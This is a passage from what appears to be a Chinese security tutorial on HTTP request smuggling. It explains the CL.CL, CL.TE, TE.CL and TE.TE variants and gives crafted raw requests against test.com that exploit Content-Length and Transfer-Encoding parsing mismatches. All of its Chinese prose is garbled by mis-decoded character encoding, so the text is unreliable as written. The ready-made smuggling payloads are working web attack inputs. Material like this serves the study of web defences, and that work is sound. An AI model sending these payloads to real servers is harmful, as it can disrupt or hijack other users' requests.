å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚</p><p>å¤§å¤šæ•°HTTPè¯·æ±‚èµ°ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼š<code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´ã€‚</p><p>åŒæ—¶ä½¿ç”¨ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ—¶ï¼Œ<code>Content-Length</code>æ— æ•ˆã€‚å½“ä½¿ç”¨å¤šä¸ªæœåŠ¡å™¨æ—¶ï¼Œå¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´æ—¶ï¼Œå°±ä¼šå‡ºç°æœ‰äº›æœåŠ¡å™¨è®¤ä¸º<code>Content-Length</code>çš„é•¿åº¦æœ‰æ•ˆï¼Œæœ‰äº›ä»¥<code>Transfer-Encoding</code>æœ‰æ•ˆã€‚è€Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨ä¹‹é—´ï¼Œä¼šé‡ç”¨TCPé“¾æ¥ã€‚è¿™æ ·è¶…å‡ºçš„é•¿åº¦å°±ä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚è¿›è¡Œè¯·æ±‚ï¼Œä»è€Œå¯¼è‡´HTTPè¯·æ±‚èµ°ç§æ¼æ´ã€‚</p><h3 id="http1-1çš„ä¸¤ä¸ªç‰¹æ€§"><a href="#http1-1çš„ä¸¤ä¸ªç‰¹æ€§" class="headerlink" title="http1.1çš„ä¸¤ä¸ªç‰¹æ€§"></a>http1.1çš„ä¸¤ä¸ªç‰¹æ€§</h3><p>åœ¨<code>HTTP1.1</code>ä¸­ï¼Œå¢åŠ äº†<code>Keep-Alive</code>å’Œ<code>Pipeline</code>è¿™ä¸¤ä¸ªç‰¹æ€§ã€‚</p><p>æ‰€è°“<code>Keep-Alive</code>ï¼Œå°±æ˜¯åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´<code>Connection: Keep-Alive</code>ï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ï¼Œè¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚å½“ç„¶ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨<code>HTTP1.1</code>ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>æœ‰äº†<code>Keep-Alive</code>ä¹‹åï¼Œåç»­å°±æœ‰äº†<code>Pipeline</code>ï¼Œåœ¨è¿™é‡Œå‘¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯</p><h2 id="httpèµ°ç§ç±»å‹"><a href="#httpèµ°ç§ç±»å‹" class="headerlink" title="httpèµ°ç§ç±»å‹"></a>httpèµ°ç§ç±»å‹</h2><p>HTTPè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†<code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´éƒ½æ”¾ç½®åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å®Œæˆæ­¤æ“ä½œçš„ç¡®åˆ‡æ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š</p><ul><li>CL.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä¹Ÿä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚</li><li>CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ã€‚</li><li>TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚</li><li>TE.TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</li></ul><h2 id="HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼"><a href="#HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼" class="headerlink" title="HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼"></a>HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼</h2><h3 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h3><p>æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ã€‚è¿™é‡Œç”¨GETè¯·æ±‚ä¸¾ä¾‹ã€‚<br>å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼›åç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„<code>Content-Length</code>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±æœ‰å¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚</p><p><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\n&#96;æ˜¯æ¢è¡Œçš„æ„æ€ï¼Œwindowsçš„æ¢è¡Œæ˜¯&#96;\r\n&#96;ï¼Œunixçš„æ˜¯&#96;\n&#96;ï¼Œmacçš„æ˜¯&#96;\r</span><br></pre></td></tr></table></figure></blockquote><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br>å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œè¯»å–<code>Content-Length</code>ï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ã€‚<br>ç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œå› ä¸ºå®ƒä¸å¯¹<code>Content-Length</code>è¿›è¡Œå¤„ç†ï¼Œç”±äº<code>Pipeline</code>çš„å­˜åœ¨ï¼Œåç«¯æœåŠ¡å™¨å°±è®¤ä¸ºè¿™æ˜¯æ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><p>ç¬¬ä¸€ä¸ªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é€ æˆäº†è¯·æ±‚èµ°ç§ã€‚</p><h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p><strong>RFC7230è§„èŒƒ</strong></p><blockquote><p>åœ¨RFC7230çš„ç¬¬3.3.3èŠ‚ä¸­çš„ç¬¬å››æ¡ä¸­ï¼Œè§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª<code>Content-Length</code>ï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ã€‚</p></blockquote><p>æœ‰äº›æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼çš„å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºç«™æœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼çš„è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400é”™è¯¯ã€‚<br>ä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ª<code>Content-Length</code>çš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ª<code>Content-Length</code>çš„å€¼è¿›è¡Œå¤„ç†ã€‚<br><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 8\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 7\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">12345\r\n</span></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br>ä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º8ï¼Œå°†ä¸Šè¿°æ•´ä¸ªæ•°æ®åŒ…åŸå°ä¸åŠ¨çš„è½¬å‘ç»™åç«¯çš„æºç«™æœåŠ¡å™¨ã€‚<br>è€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º7ã€‚å½“è¯»å–å®Œå‰7ä¸ªå­—ç¬¦åï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå¯¹åº”çš„å“åº”ï¼Œå‘é€å‡ºå»ã€‚è€Œæ­¤æ—¶çš„ç¼“å†²åŒºå»è¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯<code>a</code>ï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ª<code>a</code>æ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ä¼ è¾“å®Œæ¯•ã€‚<br>å¦‚æœæ­¤æ—¶æœ‰ä¸€ä¸ªå…¶ä»–çš„æ­£å¸¸ç”¨æˆ·å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬ä¼šé‡ç”¨TCPè¿æ¥ã€‚æ‰€ä»¥æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚å°±æ‹¼æ¥åˆ°äº†å­—æ¯<code>a</code>çš„åé¢ï¼Œå½“åç«¯æœåŠ¡å™¨æ¥æ”¶å®Œæ¯•åï¼Œå®ƒå®é™…å¤„ç†çš„è¯·æ±‚å…¶å®æ˜¯ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>è¿™æ—¶ï¼Œç”¨æˆ·å°±ä¼šæ”¶åˆ°ä¸€ä¸ªç±»ä¼¼äº<code>aGET request method not found</code>çš„æŠ¥é”™ã€‚è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡HTTPèµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯¹æ­£å¸¸ç”¨æˆ·çš„è¡Œä¸ºé€ æˆäº†å½±å“ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰©å±•æˆç±»ä¼¼äºCSRFçš„æ”»å‡»æ–¹å¼ã€‚</p><p>ä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥å—è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…ã€‚è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ<br>æ‰€ä»¥æƒ³åˆ°å‰é¢æ‰€è¯´çš„<br><strong>RFC2616è§„èŒƒ</strong></p><blockquote><p>å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨<code>Content-Length</code>å’Œ<code>Transfer-Encoding</code>è¿™ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œåœ¨å¤„ç†çš„æ—¶å€™å¿…é¡»å¿½ç•¥<code>Content-Length</code>ã€‚</p></blockquote><p>æ‰€ä»¥è¯·æ±‚åŒ…ä¸­åŒæ—¶åŒ…å«è¿™ä¸¤ä¸ªè¯·æ±‚å¤´å¹¶ä¸ç®—è¿è§„ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸éœ€è¦è¿”å›400é”™è¯¯ã€‚å¯¼è‡´æœåŠ¡å™¨åœ¨è¿™é‡Œçš„å®ç°æ›´å®¹æ˜“å‡ºé—®é¢˜ã€‚</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>CL-TEï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµå®ˆ<code>RFC2616</code>çš„è§„å®šï¼Œå¿½ç•¥æ‰<code>Content-Length</code>ï¼Œå¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ã€‚</p><p><strong>chunkä¼ è¾“æ•°æ®(sizeçš„å€¼ç”±16è¿›åˆ¶è¡¨ç¤º)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p><strong>chunkedç¼–ç </strong><br>å‚è€ƒï¼š<a href="https://blog.csdn.net/yankai0219/article/details/8269922">httpåè®®ä¸­content-length ä»¥åŠchunkedç¼–ç åˆ†æ</a><br><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 6\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p>è¿ç»­å‘é€å‡ æ¬¡è¯·æ±‚å°±å¯ä»¥è·å¾—å“åº”ã€‚<br><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br>ç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>ï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å¯¹äºå®ƒæ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè¯·æ±‚ä½“çš„é•¿åº¦ä¸º6ï¼Œä¹Ÿå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>å½“è¯·æ±‚åŒ…ç»è¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘ç»™åç«¯æœåŠ¡å™¨æ—¶ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å®ƒè¯»å–åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºå·²ç»è¯»å–åˆ°ç»“å°¾äº†ã€‚<br>ä½†å‰©ä¸‹çš„å­—æ¯<code>a</code>å°±è¢«ç•™åœ¨äº†ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚å½“æˆ‘ä»¬é‡å¤å‘é€è¯·æ±‚åï¼Œå‘é€çš„è¯·æ±‚åœ¨åç«¯æœåŠ¡å™¨æ‹¼æ¥æˆäº†ç±»ä¼¼ä¸‹é¢è¿™ç§è¯·æ±‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨åœ¨è§£ææ—¶å°±ä¼šäº§ç”ŸæŠ¥é”™äº†ï¼Œä»è€Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CLï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ã€‚<br><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Content-Length</span>: 4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">12\r\n</span></span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br>å‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å…¶è¯»å–åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚<br>æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ï¼Œå› ä¸ºè¯·æ±‚ä½“çš„é•¿åº¦ä¸º<code>4</code>.ä¹Ÿå°±æ˜¯å½“å®ƒè¯»å–å®Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure><p>å°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TEï¼Œå½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ï¼Œç¡®å®æ˜¯å®ç°äº†RFCçš„æ ‡å‡†ã€‚ä¸è¿‡å‰åç«¯æœåŠ¡å™¨ä¸æ˜¯åŒä¸€ç§ã€‚è¿™å°±æœ‰äº†ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„<code>Transfer-Encoding</code>è¿›è¡ŒæŸç§æ··æ·†æ“ä½œ(å¦‚æŸä¸ªå­—ç¬¦æ”¹å˜å¤§å°å†™)ï¼Œä»è€Œä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†<code>Transfer-Encoding</code>è¯·æ±‚å¤´ã€‚åœ¨æŸç§æ„ä¹‰ä¸Šè¿™è¿˜æ˜¯<code>CL-TE</code>æˆ–è€…<code>TE-CL</code>ã€‚<br><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Content-length</span>: 4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line"><span class="attribute">Transfer-encoding</span>: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">5c\r\n</span></span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br>å‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>ï¼Œå½“å…¶è¯»å–åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–ç»“æŸã€‚<br>æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-encoding</code>è¯·æ±‚å¤´ï¼Œå°†<code>Transfer-Encoding</code>éšè—åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ª<code>chain</code>ä¸­æ—¶ï¼Œå®ƒå°†ä¼šå›é€€åˆ°ä½¿ç”¨<code>Content-Length</code>å»å‘é€è¯·æ±‚ã€‚è¯»å–åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span 